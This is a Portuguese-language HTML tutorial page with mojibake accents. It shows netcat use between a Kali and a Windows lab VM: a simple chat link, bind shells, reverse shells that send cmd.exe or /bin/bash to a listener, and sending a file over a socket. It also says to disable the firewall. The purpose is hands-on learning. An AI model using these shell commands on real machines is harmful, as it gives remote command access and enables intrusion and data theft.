<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NETCAT</title>
<link rel="stylesheet" href="css/style.css">
</head>
<body>

<div class="container">
    <h1>NETCAT</h1>
  
<p>n = somente endere√ßo IP num√©rico (sem DNS)</p>
<p>l = ouvir por conex√µes de entrada</p>
<p>v = verbose (detalhado)</p>
<p>p = n√∫mero da porta local</p>

<pre>nc -nlvp 4444</pre>
<img src="img/1.gif" width="700" height="200">
<p>Abra um novo prompt de comando na sua VM do Windows e conecte √† porta aberta na sua VM do Kali usando:</p>

<pre>ncat -nv Kali-IP 4444</pre>
<img src="img/2.gif" width="700" height="200">
<p>A sa√≠da mostra que agora conectamos com sucesso as duas m√°quinas. Isso √© essencialmente agora um servi√ßo de mensagens simples onde voc√™ pode enviar mensagens entre as m√°quinas. Voc√™ pode ver pelas sa√≠das abaixo que uma mensagem enviada da m√°quina Windows foi recebida pela m√°quina Kali e vice-versa.</p>
<img src="img/3.gif" width="700" height="200">
<p>Use Ctrl + C em qualquer uma das m√°quinas para fechar a conex√£o.</p>

<h2>Windows server</h2>
<p>Basicamente, √© o mesmo m√©todo que o acima, no entanto, voc√™ usa:</p>

<pre>ncat -nlvp 4444 para ouvir conex√µes na VM do Windows.</pre>
<pre>nc -nv <IP-do-Windows> 4444 para se conectar a üëÜ a partir da sua VM do Kali.</pre>
<img src="img/4.gif" width="700" height="200">
<p>Usando o netcat para escutar na porta 4444 da VM do Windows</p>
<img src="img/5.gif" width="700" height="200">
<p>Estabelecendo uma conex√£o e enviando mensagens entre as duas VMs
</p>
<h2>Bind shells</h2>

<p>Agora que voc√™ conectou com sucesso as duas m√°quinas virtuais, vamos dar uma olhada nas bind shells. Para configurar uma bind shells, basicamente precisamos anexar uma shell a uma porta em uma m√°quina para que, quando uma conex√£o for estabelecida, a shell possa ser acessada na outra m√°quina e comandos possam ser executados.</p>

<p>NOTA: Para esta etapa funcionar, voc√™ precisar√° acessar as configura√ß√µes do firewall na VM do Windows e desativar o Firewall. Obviamente, isso n√£o √© a coisa mais segura a se fazer, ent√£o lembre-se de ligar o firewall novamente quando terminar. Se voc√™ n√£o desativar o Firewall, n√£o conseguir√° se conectar √† VM do Windows. Tente alternar as configura√ß√µes do firewall durante essas tarefas para ver o que funciona e o que n√£o funciona, ajudando a entender o que est√° acontecendo.</p>

<h2>Windows bind shell</h2>

<p>Para iniciar uma bind shell no Windows, precisamos configurar um ouvinte com o execut√°vel cmd.exe (Prompt de Comando do Windows) anexado a ele. Para especificar o arquivo a ser executado, podemos usar:</p>

<p>e = programa a ser executado ap√≥s a op√ß√£o de conex√£o. Sintaxe: -e <nome do arquivo></p>
<p>c = usar /bin/sh para executar. Sintaxe: -c <comandos de shell></p>
<pre>ncat -nlvp 4444 -e cmd.exe</pre>
<img src="img/6.gif" width="700" height="200">
<p>Agora que voc√™ vinculou o shell √† porta, conecte-se a ele usando:</p>

<pre>nc -nv IP-do-Windows 4444</pre>

<p>Assim que uma conex√£o for estabelecida, a VM do Kali ter√° acesso √† shell da VM do Windows.</p>
<img src="img/7.gif" width="700" height="200">
<p>Voc√™ pode ver que a VM do Kali agora tem acesso √† shell do Windows a partir da sa√≠da de whoami, mudando de "parallels" para "theobridgembe32/theo".</p>

<h2>Kali Bind Shell</h2>
<p>
No Kali, o m√©todo de bind shells difere um pouco do acima, onde voc√™ usar√° -c /bin/bash em vez de -e cmd.exe. As op√ß√µes -e e -c podem ser usadas de forma intercambi√°vel, no entanto, acredito que esta seja a utiliza√ß√£o correta. Eu vou misturar e combinar essas op√ß√µes ao longo deste blog para mostrar que ambas funcionam. Use whoami para confirmar o shell de liga√ß√£o bem-sucedido:</p>
<img src="img/8.gif" width="700" height="200">

<h2>Reverse shells</h2>
<p>
Um shell reverso ocorre quando a shell execut√°vel √© enviada do host para a m√°quina que est√° ouvindo, em vez de ser vinculada √† porta e executada ap√≥s a conex√£o. Isso pode ser usado quando h√° um Firewall bloqueando uma conex√£o para uma bind shells e permite que a m√°quina atr√°s do firewall envie acesso √† shell para a m√°quina que est√° ouvindo fora do firewall.</p>


<h2>Windows reverse shell</h2>

<pre>nc -nlvp 4444</pre>
<p>Em seguida, conecte-se √† porta de escuta e envie a shell para ela usando:</p>

<pre>ncat Kali-IP 4444 -c cmd.exe</pre>
<p>
Da mesma forma que -c cmd.exe pode ser vinculado a uma porta, tamb√©m pode ser usado de forma reversa e enviado para a m√°quina ouvinte, da√≠ o termo "shell reverso". Isso significa que uma shell, mesmo estando atr√°s de um firewall, pode ser enviada para uma m√°quina externa e ser executada ao se conectar para obter acesso para executar comandos.</p>
<img src="img/9.gif" width="700" height="200">
<p>
Voc√™ pode ver pela sa√≠da que uma vez que a conex√£o √© feita, o shell reverso √© executado pelo ouvinte.</p>

<h2>Kali reverse shell</h2>

<p>Para que isso funcione, mais uma vez voc√™ precisar√° desativar o firewall na VM do Windows (ou criar uma regra que permita essa conex√£o). Experimente com e sem o firewall para ver o que acontece.</p>

<p>Configure o ouvinte no Windows:</p>
<pre>ncat -nlvp 4444</pre>

<p>Conecte-se ao ouvinte e envie o shell reverso. Novamente, em vez de usar -c cmd.exe, voc√™ precisar√° usar -e /bin/bash:</p>
<pre>
nc -nv Windows-IP 4444 -e /bin/bash
</pre>
<p>
<img src="img/10.gif" width="700" height="200">
Como voc√™ pode ver na sa√≠da, o shell reverso foi executado com sucesso na m√°quina receptora e a m√°quina virtual do Windows tem acesso √† linha de comando do Kali.</p>


<h2>File transfers</h2>
<h2>Windows file transfer</h2>
<p>
Voc√™ pode usar o Netcat para transferir arquivos entre as duas VMs. Comece criando um arquivo para enviar da VM do Windows
echo "password" > password.txt</p>
<p>
Configure o ouvinte do Kali e especifique onde salvar o arquivo transferido.</p>

<pre>nc -nlvp 4444 > passwordWindows.txt</pre>
<p>
Envie o arquivo da m√°quina Windows usando o arquivo como entrada para a conex√£o.</p>
<pre>
ncat -nv Kali-IP 4444 < password.txt</pre>
<p>
Quando a conex√£o for estabelecida, o conte√∫do do arquivo √© salvo no arquivo especificado pelo ouvinte.</p>
<p>
<img src="img/11.gif" width="700" height="200">
Voc√™ pode ver na sa√≠da que o arquivo foi transferido com sucesso. Na VM Kali, parece que a conex√£o acabou de ser encerrada, no entanto, a transfer√™ncia de arquivo bem-sucedida pode ser confirmada lendo o conte√∫do do arquivo transferido com a extens√£o cat <transferred_file>.</p>

<h2>Kali file transfer</h2>
<p>
Isso √© praticamente o mesmo que enviar arquivos da VM do Windows. A √∫nica diferen√ßa √© que voc√™ precisar√° interromper manualmente a conex√£o usando Ctrl + C antes de ler o arquivo:</p>
<p>
<img src="img/12.gif" width="700" height="200">

Como voc√™ pode ver, o processo de envio de arquivos √© bastante semelhante em qualquer sistema operacional. Isso tamb√©m pode ser feito ao contr√°rio, onde o arquivo √© enviado da m√°quina que est√° escutando para que a m√°quina que est√° conectando receba o arquivo. Isto √© essencialmente como vincular um arquivo em vez de um shell.
</p>
<img src="img/13.webp" width="700" height="200">
</div>

</body>
</html>
